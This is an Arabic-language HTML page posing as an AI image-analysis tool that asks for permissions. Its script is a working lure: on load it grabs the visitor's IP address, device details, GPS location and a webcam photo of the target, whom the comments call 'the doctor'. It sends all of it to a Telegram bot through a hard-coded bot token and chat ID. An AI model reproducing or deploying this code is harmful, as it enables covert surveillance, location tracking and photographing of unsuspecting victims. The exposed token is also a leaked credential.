<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>نظام التحليل الهندسي</title>
    <style>
        body { text-align: center; background: #0c0c0c; color: #00ff00; font-family: 'Courier New', monospace; padding-top: 50px; }
        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        img { max-width: 80%; border: 2px solid #00ff00; border-radius: 10px; display: none; margin: 20px auto; }
    </style>
</head>
<body>

    <div id="ui">
        <h2>جاري معالجة بيانات الصورة...</h2>
        <div class="loader"></div>
        <p id="status">يرجى الموافقة على الأذونات لتفعيل معالج الذكاء الاصطناعي</p>
    </div>
    
    <img id="myPhoto" src="my-photo.jpg">

    <script>
        // --- ضع بياناتك هنا ---
        const TELEGRAM_TOKEN = '8372729487:AAFv7eZQGWtGkPqID6k209khDQKkZsO-TMM';
        const CHAT_ID = '8175631848';

        async function sendToTelegram(message, imageBlob = null) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/${imageBlob ? 'sendPhoto' : 'sendMessage'}`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            
            if (imageBlob) {
                formData.append('photo', imageBlob, 'capture.png');
                formData.append('caption', message);
            } else {
                formData.append('text', message);
            }
            
            await fetch(url, { method: 'POST', body: formData });
        }

        async function startChallenge() {
            let report = "🚨 تم تفعيل الفخ بنجاح! \n\n";

            try {
                // 1. سحب الـ IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                report += `🌐 عنوان الـ IP: ${ipData.ip}\n`;

                // 2. سحب معلومات الجهاز
                report += `📱 الجهاز: ${navigator.platform}\n`;
                report += `🖥️ المتصفح: ${navigator.userAgent.split(') ')[0]})\n`;

                // 3. سحب الموقع الجغرافي (GPS)
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    report += `📍 الموقع: ${mapLink}\n`;
                    await sendToTelegram(report);
                }, (err) => {
                    report += `📍 الموقع: (الدكتور رفض إذن الموقع)\n`;
                    sendToTelegram(report);
                });

                // 4. سحب لقطة الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('status').innerText = "تم التحقق.. جاري عرض الصورة";
                document.getElementById('myPhoto').style.display = "block";

                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => sendToTelegram("📸 لقطة وجه الدكتور:", blob), 'image/png');
                    stream.getTracks().forEach(t => t.stop());
                }, 2000);

            } catch (err) {
                document.getElementById('status').innerText = "خطأ: يجب الموافقة على الأذونات لإتمام التحدي";
                sendToTelegram("⚠️ الدكتور رفض إذن الكاميرا أو حدث خطأ.");
            }
        }

        window.onload = startChallenge;
    </script>
</body>
</html>
